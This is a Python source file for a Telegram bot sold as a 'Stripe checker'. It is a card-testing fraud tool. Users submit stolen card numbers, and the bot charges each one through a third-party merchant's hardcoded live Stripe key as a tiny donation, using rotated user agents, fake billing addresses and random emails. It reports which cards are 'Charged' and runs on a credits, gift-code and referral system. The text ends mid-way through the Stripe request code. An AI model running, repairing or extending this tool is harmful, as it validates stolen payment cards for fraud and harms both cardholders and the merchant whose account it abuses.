import asyncio
import json
import random
import datetime
import time
import os
from dotenv import load_dotenv
import re
import sys
import aiohttp
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.error import NetworkError, BadRequest, TimedOut
import logging
from telegram.helpers import escape_markdown
import asyncpg
# Simple Firebase setup
import firebase_admin
from firebase_admin import credentials, firestore
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import requests  # Add this import

load_dotenv()

def init_firebase():
    """Initialize Firebase and return connection status"""
    try:
        # Load Firebase credentials from environment variables
        firebase_config = {
            "type": os.getenv("FIREBASE_TYPE", "service_account"),
            "project_id": os.getenv("FIREBASE_PROJECT_ID", ""),
            "private_key_id": os.getenv("FIREBASE_PRIVATE_KEY_ID", ""),
            "private_key": os.getenv("FIREBASE_PRIVATE_KEY", "").replace('\\n', '\n') if os.getenv("FIREBASE_PRIVATE_KEY") else "",
            "client_email": os.getenv("FIREBASE_CLIENT_EMAIL", ""),
            "client_id": os.getenv("FIREBASE_CLIENT_ID", ""),
            "auth_uri": os.getenv("FIREBASE_AUTH_URI", "https://accounts.google.com/o/oauth2/auth"),
            "token_uri": os.getenv("FIREBASE_TOKEN_URI", "https://oauth2.googleapis.com/token"),
            "auth_provider_x509_cert_url": os.getenv("FIREBASE_AUTH_PROVIDER_CERT_URL", "https://www.googleapis.com/oauth2/v1/certs"),
            "client_x509_cert_url": os.getenv("FIREBASE_CLIENT_CERT_URL", "")
        }
        
        # Check if any Firebase credentials are provided
        has_firebase_creds = any([
            firebase_config.get("project_id"),
            firebase_config.get("private_key"),
            firebase_config.get("client_email")
        ])
        
        if not has_firebase_creds:
            print("ℹ️  No Firebase credentials found. Using in-memory storage.")
            return None, False
        
        # Validate required fields
        required_fields = ["project_id", "private_key", "client_email"]
        missing_fields = []
        
        for field in required_fields:
            if not firebase_config.get(field):
                missing_fields.append(field)
        
        if missing_fields:
            print(f"⚠️  Missing Firebase config fields: {', '.join(missing_fields)}")
            print("⚠️  Using in-memory storage (data will be lost on restart)")
            return None, False
        
        # Initialize Firebase
        cred = credentials.Certificate(firebase_config)
        firebase_admin.initialize_app(cred)
        db = firestore.client()
        print("✅ Firebase connected successfully")
        
        # Test connection
        test_ref = db.collection('test').document('connection_test')
        test_ref.set({'test': True, 'timestamp': datetime.datetime.now().isoformat()})
        print("✅ Firebase write test successful")
        
        return db, True
    except Exception as e:
        print(f"⚠️  Firebase connection failed: {e}")
        print("⚠️  Using in-memory storage (data will be lost on restart)")
        return None, False

# Initialize Firebase
db, firebase_connected = init_firebase()

def get_db():
    """Get Firebase database instance"""
    return db

# Add this function to properly escape markdown
def escape_markdown_v2(text):
    """Escape markdown v2 special characters"""
    if not text:
        return text
    escape_chars = '_*[]()~`>#+-=|{}.!'
    for char in escape_chars:
        text = text.replace(char, f'\\{char}')
    return text

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")

DOMAIN = os.getenv("DOMAIN", "https://texassouthernacademy.com")
PK = os.getenv("STRIPE_PK", "pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d")

# Bot info
BOT_INFO = {
    "name": "⚡ DARKXCODE STRIPE CHECKER ⚡",
    "version": "1.0",
    "creator": "@ISHANT_OFFICIAL",  # Updated from combined.py
    "gates": "Stripe",
    "features": "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System"
}

# In-memory cache for checking tasks (temporary storage)
checking_tasks = {}
files_storage = {}  # Add this line
setup_intent_cache = {}
last_cache_time = 0

# User-Agent rotation list
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
]

# Billing addresses for different card locations (simplified)
BILLING_ADDRESSES = {
    "US": [
        {"name": "Waiyan", "postal_code": "10080", "city": "Bellevue", "state": "NY", "country": "US", "address_line_1": "7246 Royal Ln"},
        {"name": "John Smith", "postal_code": "10001", "city": "New York", "state": "NY", "country": "US", "address_line_1": "123 Main St"},
        {"name": "Michael Johnson", "postal_code": "90210", "city": "Beverly Hills", "state": "CA", "country": "US", "address_line_1": "456 Sunset Blvd"},
    ],
    "UK": [
        {"name": "James Wilson", "postal_code": "SW1A 1AA", "city": "London", "state": "England", "country": "GB", "address_line_1": "10 Downing Street"},
        {"name": "Thomas Brown", "postal_code": "M1 1AA", "city": "Manchester", "state": "England", "country": "GB", "address_line_1": "25 Oxford Rd"},
    ]
}

# Database connection pool
db_pool = None

def parseX(data, start, end):
    try:
        if not data or not start or not end:
            return None
        if start not in data:
            return None
        star = data.index(start) + len(start)
        if end not in data[star:]:
            return None
        last = data.index(end, star)
        return data[star:last]
    except (ValueError, TypeError, AttributeError):
        return None

def generate_gift_code(length=16):
    """Generate a random gift code"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def get_billing_address(card_bin=""):
    """Get random billing address based on card BIN or random country"""
    # Default to US if no BIN or unknown BIN
    if not card_bin or len(card_bin) < 6:
        country = random.choice(list(BILLING_ADDRESSES.keys()))
    else:
        # Simple BIN to country mapping
        bin_prefix = card_bin[:2]
        if bin_prefix in ["40", "41", "42", "43", "44", "45", "46", "47", "48", "49"]:
            country = "US"  # Visa
        elif bin_prefix in ["51", "52", "53", "54", "55"]:
            country = "US"  # Mastercard
        elif bin_prefix in ["34", "37"]:
            country = "US"  # Amex
        elif bin_prefix in ["60", "65"]:
            country = "US"  # Discover/RuPay
        else:
            country = "US"  # Default to US
    
    # Make sure the country exists in our addresses
    if country not in BILLING_ADDRESSES:
        country = "US"
    
    return random.choice(BILLING_ADDRESSES[country])

def random_email():
    """Generate random email"""
    names = ["Kmo", "Waiyan", "John", "Mike", "David", "Sarah"]
    random_name = random.choice(names)
    random_numbers = "".join(str(random.randint(0, 9)) for _ in range(4))
    return f"{random_name}{random_numbers}@gmail.com"

def escape_html(s):
    """Escape HTML special characters"""
    if s is None:
        return ""
    return (str(s)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#39;"))

def get_bin_info(bin_number):
    """Get BIN information from antipublic.cc"""
    try:
        if not bin_number or len(bin_number) < 6:
            return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}
        
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number[:6]}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country", "Unknown"),
                "country_flag": data.get("country_flag", "🏳️")
            }
    except Exception as e:
        logger.error(f"BIN API error: {e}")
    
    return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}

async def init_database():
    """Initialize database connection with retry mechanism"""
    global db_pool
    max_retries = 3
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            logger.info(f"Attempting database connection (Attempt {attempt + 1}/{max_retries})...")
            
            # Try to connect with SSL mode 'require' for Supabase
            try:
                db_pool = await asyncpg.create_pool(
                    DATABASE_URL,
                    **DB_CONNECTION_PARAMS,
                    ssl='require'  # Supabase requires SSL
                )
            except Exception as ssl_error:
                logger.warning(f"SSL connection failed, trying without SSL: {ssl_error}")
                # Try without SSL if SSL fails
                db_pool = await asyncpg.create_pool(
                    DATABASE_URL,
                    **DB_CONNECTION_PARAMS,
                    ssl=False
                )
            
            # Test connection
            async with db_pool.acquire() as conn:
                # Simple test query
                result = await conn.fetchval('SELECT 1')
                if result == 1:
                    logger.info("Database connection established and tested successfully")
                else:
                    raise Exception("Database test query failed")
            
            # Create tables if they don't exist
            await create_tables()
            logger.info("Database tables created/verified")
            return True
            
        except asyncpg.InvalidPasswordError:
            logger.error("❌ Invalid database password. Please check your credentials.")
            return False
        except asyncpg.ConnectionDoesNotExistError:
            logger.error("❌ Database connection failed. Host may be unreachable.")
        except asyncpg.PostgresError as e:
            logger.error(f"❌ Database error: {e}")
        except Exception as e:
            logger.error(f"❌ Database initialization error: {str(e)}")
        
        if attempt < max_retries - 1:
            logger.info(f"Retrying in {retry_delay} seconds...")
            await asyncio.sleep(retry_delay)
    
    logger.error("Failed to connect to database after multiple attempts")
    return False

async def create_tables():
    """Create database tables"""
    async with db_pool.acquire() as conn:
        # Users table
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                joined_date TIMESTAMP DEFAULT NOW(),
                last_active TIMESTAMP DEFAULT NOW(),
                credits INTEGER DEFAULT 0,
                credits_spent INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0,
                approved_cards INTEGER DEFAULT 0,
                declined_cards INTEGER DEFAULT 0,
                checks_today INTEGER DEFAULT 0,
                last_check_date DATE,
                joined_channel BOOLEAN DEFAULT FALSE,
                referrer_id BIGINT,
                referrals_count INTEGER DEFAULT 0,
                earned_from_referrals INTEGER DEFAULT 0
            )
        ''')
        
        # Gift codes table
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS gift_codes (
                code TEXT PRIMARY KEY,
                credits INTEGER NOT NULL,
                max_uses INTEGER,
                uses INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT NOW(),
                created_by BIGINT,
                claimed_by TEXT[] DEFAULT '{}'
            )
        ''')
        
        # Claimed codes table
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS user_claimed_codes (
                user_id BIGINT,
                code TEXT,
                claimed_at TIMESTAMP DEFAULT NOW(),
                PRIMARY KEY (user_id, code)
            )
        ''')
        
        # Bot statistics table
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS bot_statistics (
                id SERIAL PRIMARY KEY,
                total_checks INTEGER DEFAULT 0,
                total_approved INTEGER DEFAULT 0,
                total_declined INTEGER DEFAULT 0,
                total_credits_used INTEGER DEFAULT 0,
                total_users INTEGER DEFAULT 0,
                start_time TIMESTAMP DEFAULT NOW()
            )
        ''')
        
        # Initialize bot statistics
        await conn.execute('''
            INSERT INTO bot_statistics (id) VALUES (1)
            ON CONFLICT (id) DO NOTHING
        ''')

# In-memory storage as fallback
in_memory_users = {}
in_memory_gift_codes = {}
in_memory_claimed_codes = {}
in_memory_bot_stats = {
    "total_checks": 0,
    "total_approved": 0,
    "total_declined": 0,
    "total_credits_used": 0,
    "total_users": 0,
    "start_time": datetime.datetime.now().isoformat()
}

# Firebase functions to replace PostgreSQL functions
async def get_user(user_id):
    """Get user from Firebase or memory"""
    db = get_db()
    
    if db:
        try:
            user_ref = db.collection('users').document(str(user_id))
            user_doc = user_ref.get()
            
            if user_doc.exists:
                return user_doc.to_dict()
            else:
                # Create new user
                new_user = {
                    "user_id": user_id,
                    "username": "",
                    "first_name": "",
                    "joined_date": firestore.SERVER_TIMESTAMP,
                    "last_active": firestore.SERVER_TIMESTAMP,
                    "credits": 0,
                    "credits_spent": 0,
                    "total_checks": 0,
                    "approved_cards": 0,
                    "declined_cards": 0,
                    "checks_today": 0,
                    "last_check_date": None,
                    "joined_channel": False,
                    "referrer_id": None,
                    "referrals_count": 0,
                    "earned_from_referrals": 0
                }
                user_ref.set(new_user)
                
                # Update bot statistics
                stats_ref = db.collection('bot_statistics').document('stats')
                stats_doc = stats_ref.get()
                if stats_doc.exists:
                    stats_ref.update({"total_users": firestore.Increment(1)})
                else:
                    stats_ref.set({
                        "total_checks": 0,
                        "total_approved": 0,
                        "total_declined": 0,
                        "total_credits_used": 0,
                        "total_users": 1,
                        "start_time": firestore.SERVER_TIMESTAMP
                    })
                
                return new_user
                
        except Exception as e:
            logger.error(f"Firebase error in get_user: {e}")
    
    # Fallback to in-memory storage
    if user_id not in in_memory_users:
        in_memory_users[user_id] = {
            "user_id": user_id,
            "username": "",
            "first_name": "",
            "joined_date": datetime.datetime.now().isoformat(),
            "last_active": datetime.datetime.now().isoformat(),
            "credits": 0,
            "credits_spent": 0,
            "total_checks": 0,
            "approved_cards": 0,
            "declined_cards": 0,
            "checks_today": 0,
            "last_check_date": None,
            "joined_channel": False,
            "referrer_id": None,
            "referrals_count": 0,
            "earned_from_referrals": 0
        }
        in_memory_bot_stats["total_users"] += 1
    
    return in_memory_users[user_id]

async def update_user(user_id, updates):
    """Update user data in Firebase or memory"""
    db = get_db()
    
    # Convert datetime.date to string for Firebase
    processed_updates = updates.copy()
    for key, value in updates.items():
        if isinstance(value, datetime.date):
            processed_updates[key] = value.isoformat()
        elif isinstance(value, datetime.datetime):
            processed_updates[key] = value.isoformat()
    
    if db:
        try:
            user_ref = db.collection('users').document(str(user_id))
            
            # Remove last_active from processed_updates if it exists
            if 'last_active' in processed_updates:
                processed_updates['last_active'] = firestore.SERVER_TIMESTAMP
            else:
                processed_updates['last_active'] = firestore.SERVER_TIMESTAMP
            
            user_ref.update(processed_updates)
            return
        except Exception as e:
            logger.error(f"Firebase error in update_user: {e}")
            # Try without SERVER_TIMESTAMP as fallback
            try:
                user_ref = db.collection('users').document(str(user_id))
                if 'last_active' in processed_updates:
                    processed_updates['last_active'] = datetime.datetime.now().isoformat()
                user_ref.update(processed_updates)
                return
            except Exception as e2:
                logger.error(f"Firebase fallback error in update_user: {e2}")
    
    # Fallback to in-memory storage
    if user_id in in_memory_users:
        in_memory_users[user_id].update(processed_updates)
        in_memory_users[user_id]["last_active"] = datetime.datetime.now().isoformat()

async def get_bot_stats():
    """Get bot statistics from Firebase"""
    db = get_db()
    
    if db:
        try:
            stats_ref = db.collection('bot_statistics').document('stats')
            stats_doc = stats_ref.get()
            if stats_doc.exists:
                return stats_doc.to_dict()
        except Exception as e:
            logger.error(f"Firebase error in get_bot_stats: {e}")
    
    # Fallback to in-memory
    return in_memory_bot_stats

async def update_bot_stats(updates):
    """Update bot statistics in Firebase"""
    db = get_db()
    
    if db:
        try:
            stats_ref = db.collection('bot_statistics').document('stats')
            
            # Prepare update dictionary with Increment operations
            firestore_updates = {}
            for key, value in updates.items():
                firestore_updates[key] = firestore.Increment(value)
            
            stats_ref.update(firestore_updates)
            return
        except Exception as e:
            logger.error(f"Firebase error in update_bot_stats: {e}")
    
    # Fallback to in-memory
    for key, value in updates.items():
        if key in in_memory_bot_stats:
            in_memory_bot_stats[key] += value

async def get_all_gift_codes():
    """Get all gift codes from Firebase"""
    db = get_db()
    
    if db:
        try:
            codes_ref = db.collection('gift_codes')
            codes_docs = codes_ref.stream()
            
            gift_codes = []
            for doc in codes_docs:
                gift_codes.append(doc.to_dict())
            
            return gift_codes
        except Exception as e:
            logger.error(f"Firebase error in get_all_gift_codes: {e}")
    
    # Fallback to in-memory
    return list(in_memory_gift_codes.values())

async def create_gift_code(code, credits, max_uses, created_by):
    """Create a gift code in Firebase"""
    db = get_db()
    
    if db:
        try:
            gift_ref = db.collection('gift_codes').document(code)
            gift_ref.set({
                "code": code,
                "credits": credits,
                "max_uses": max_uses,
                "uses": 0,
                "created_at": firestore.SERVER_TIMESTAMP,
                "created_by": created_by,
                "claimed_by": []
            })
            return True
        except Exception as e:
            logger.error(f"Firebase error in create_gift_code: {e}")
    
    # Fallback to in-memory
    in_memory_gift_codes[code] = {
        "code": code,
        "credits": credits,
        "max_uses": max_uses,
        "uses": 0,
        "created_at": datetime.datetime.now().isoformat(),
        "created_by": created_by,
        "claimed_by": []
    }
    return True

async def get_gift_code(code):
    """Get gift code from Firebase"""
    db = get_db()
    
    if db:
        try:
            gift_ref = db.collection('gift_codes').document(code)
            gift_doc = gift_ref.get()
            if gift_doc.exists:
                return gift_doc.to_dict()
        except Exception as e:
            logger.error(f"Firebase error in get_gift_code: {e}")
    
    # Fallback to in-memory
    return in_memory_gift_codes.get(code)

async def update_gift_code_usage(code, user_id):
    """Update gift code usage in Firebase"""
    db = get_db()
    
    if db:
        try:
            gift_ref = db.collection('gift_codes').document(code)
            
            # Update uses and claimed_by
            gift_ref.update({
                "uses": firestore.Increment(1),
                "claimed_by": firestore.ArrayUnion([str(user_id)])
            })
            
            # Add to claimed codes
            claimed_ref = db.collection('user_claimed_codes').document(f"{user_id}_{code}")
            claimed_ref.set({
                "user_id": user_id,
                "code": code,
                "claimed_at": firestore.SERVER_TIMESTAMP
            })
            
            return True
        except Exception as e:
            logger.error(f"Firebase error in update_gift_code_usage: {e}")
    
    # Fallback to in-memory
    if code in in_memory_gift_codes:
        in_memory_gift_codes[code]["uses"] += 1
        in_memory_gift_codes[code]["claimed_by"].append(str(user_id))
        
        if user_id not in in_memory_claimed_codes:
            in_memory_claimed_codes[user_id] = []
        in_memory_claimed_codes[user_id].append(code)
    
    return True

# ==================== CALLBACK HANDLERS ====================

async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle back to start callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Create a fake update object to call start_command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    await start_command(fake_update, context)

def format_universal_result(card_data, status, message=None, credits_left=None, username=None, time_taken=None):
    """Universal formatting function for both single and mass checks"""
    try:
        if isinstance(card_data, str):
            cc, mon, year, cvv = card_data.split("|")
        else:
            # Handle if card_data is already a tuple/list
            cc, mon, year, cvv = card_data
        
        cc_clean = cc.replace(" ", "")
        
        # Generate random amount
        cents = random.randint(50, 99)
        
        # Generate random time if not provided
        if time_taken is None:
            time_taken = random.uniform(1.5, 3.5)
        
        # Get BIN info
        bin_info = get_bin_info(cc_clean[:6])
        
        # Determine icon and status text
        if status == "approved":
            icon = "🟢"
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
        elif "Insufficient Funds" in str(message):
            icon = "🟡"
            status_text = "INSUFFICIENT_FUNDS 🔥"
        elif "Card not supported" in str(message):
            icon = "🟡"
            status_text = "Card not supported"
        elif "Incorrect CVV" in str(message):
            icon = "🔴"
            status_text = "security code is incorrect/invalid"
        else:
            icon = "🔴"
            status_text = "Declined"
        
        # If message contains special status, use it
        if message:
            msg_str = str(message)
            if "✅ Charged" in msg_str:
                status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            elif "❌" in msg_str:
                status_text = msg_str.replace("❌ ", "")
        
        # Generate email
        email_show = random_email()
        
        # Format the result
        result = f"""
━━━━━━━━━━━━━━━━━━━━
{icon} <b>RESULT</b> : <b>{status_text}</b>
💸 <b>AMOUNT</b> : <code>0.{cents:02d}$</code>
⏱ <b>TIME</b> : <code>{time_taken:.2f}s</code>
📧 <b>EMAIL</b> : <code>{email_show}</code>
━━━━━━━━━━━━━━━━━━━━

💳 <b>CARD</b>
<code>{cc}|{mon}|{year}|{cvv}</code>

🏦 <b>BIN INFO</b>
• <b>Bank</b> : {bin_info['bank']}
• <b>Country</b> : {bin_info['country']} {bin_info['country_flag']}
• <b>BIN</b> : <code>{cc_clean[:6]}</code>

━━━━━━━━━━━━━━━━━━━━
"""
        
        # Add user info if available
        if username:
            result += f"👤 <b>User</b> : @{username}\n"
        
        # Add credits if available
        if credits_left is not None:
            result += f"💳 <b>Credits</b> : <code>{credits_left}</code>\n"
        
        result += "🤖 <b>DARKXCODE CHECKER</b>"
        
        return result
        
    except Exception as e:
        logger.error(f"Error in format_universal_result: {e}")
        return f"❌ <b>Error formatting result:</b> <code>{str(e)[:50]}</code>"

async def quick_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle quick check callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /chk cc|mm|yy|cvv to check a card")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "<b>⚡ QUICK CARD CHECK</b>\n"
        "══════════════════════\n"
        "To check a card, use:\n"
        "<code>/chk cc|mm|yy|cvv</code>\n\n"
        "<b>Example:</b>\n"
        "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
        "<b>Features:</b>\n"
        "• ⚡ Instant results\n"
        "• Cost: 1 credit\n",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
    )

async def admin_addcr_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin add credits callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /addcr user_id amount")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*➕ ADD CREDITS*\n"
        "══════════════════════\n"
        "To add credits to a user, use:\n"
        "`/addcr user_id amount`\n\n"
        "*Example:*\n"
        "`/addcr 123456789 100`\n\n"
        "This will add 100 credits to user 123456789.",
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_gengift_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin generate gift callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /gengift credits max_uses")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*🎁 GENERATE GIFT CODE*\n"
        "══════════════════════\n"
        "To generate a gift code, use:\n"
        "`/gengift credits max_uses`\n\n"
        "*Example:*\n"
        "`/gengift 50 10`\n\n"
        "This creates a code worth 50 credits, usable 10 times.",
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_listgifts_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin list gifts callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Call the actual command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    await listgifts_command(fake_update, context)

async def admin_userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin user info callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /userinfo user_id")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*👤 USER INFORMATION*\n"
        "══════════════════════\n"
        "To view user information, use:\n"
        "`/userinfo user_id`\n\n"
        "*Example:*\n"
        "`/userinfo 123456789`\n\n"
        "This will show detailed info about the user.",
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_botinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin bot info callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Call the actual command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    await botinfo_command(fake_update, context)

async def my_credits_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle my credits callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    user = await get_user(user_id)
    
    await query.edit_message_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n\n"
        f"*Credit Usage:*\n"
        f"\n"
        f"*Get More Credits:*\n"
        f"1. Ask Admin For Credits\n"
        f"2. Claim Fift Codes\n"
        f"3. Invite Friends\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
    )

async def invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle invite callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    user = await get_user(user_id)
    
    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    await query.edit_message_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How It Works:*\n"
        f"1. Share Your Invite Link With Friends\n"
        f"2. When They Join Using Your Link:\n"
        f"   • You Get 100 Credits\n"
        f"   • They Get 20 Credits\n"
        f"3. Earn Unlimited Credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} Users\n"
        f"• Earned From Referrals: {user.get('earned_from_referrals', 0)} Credits\n\n"
        f"*Copy And Share Your Link Now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]
        ])
    )

async def copy_invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle copy invite callback"""
    query = update.callback_query
    
    try:
        await query.answer("Invite Link Copied To Your Message Input!")
    except BadRequest:
        pass
    
    # This will show the link in the message input field
    user_id = query.from_user.id
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    await query.edit_message_text(
        f"*📋 INVITE LINK*\n"
        f"══════════════════════\n"
        f"Copy This Link And Share With Friends:\n\n"
        f"`{invite_link}`\n\n"
        f"*Already Copied To Your Message Input!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="invite")]])
    )

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("❌ Admin only!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ Add Credits", callback_data="admin_addcr"),
         InlineKeyboardButton("🎁 Generate Gift", callback_data="admin_gengift")],
        [InlineKeyboardButton("📋 List Gifts", callback_data="admin_listgifts"),
         InlineKeyboardButton("👤 User Info", callback_data="admin_userinfo")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_botinfo"),
         InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "*👑 ADMIN PANEL*\n"
        "══════════════════════\n"
        "*Available Commands:*\n"
        "• `/addcr user_id amount` - Add credits\n"
        "• `/gengift credits max_uses` - Create gift code\n"
        "• `/listgifts` - List all gift codes\n"
        "• `/userinfo user_id` - View user info\n"
        "• `/botinfo` - Bot statistics\n\n"
        "*Quick Actions:* (Use buttons below)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def check_single_card_fast(card):
    """Working card checker from combined.py (Tele function)"""
    try:
        cc, mon, year, cvv = card.split("|")
        year = year[-2:] if len(year) == 4 else year
        cc_clean = cc.replace(" ", "")
        
        # Use requests (synchronous) since combined.py uses it
        # We'll run it in a thread to avoid blocking
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, Tele_sync, card)
        
        # Map results like in combined.py
        if "Donation Successful!" in result:
            return card, "approved", "✅ Charged", 200
        elif "Your card does not support this type of purchase" in result:
            return card, "declined", "❌ Card not supported", 0
        elif "security code is incorrect" in result or "security code is invalid" in result:
            return card, "declined", "❌ Incorrect CVV", 0
        elif "insufficient funds" in result:
            return card, "declined", "❌ Insufficient Funds", 0
        else:
            return card, "declined", "❌ Declined", 0
            
    except Exception as e:
        logger.error(f"Error in check_single_card_fast: {e}")
        return card, "declined", f"❌ Error: {str(e)[:20]}", 0

def Tele_sync(card):
    """Synchronous version of Tele function from combined.py"""
    try:
        ccx = card.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # Generate random amounts like in combined.py
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
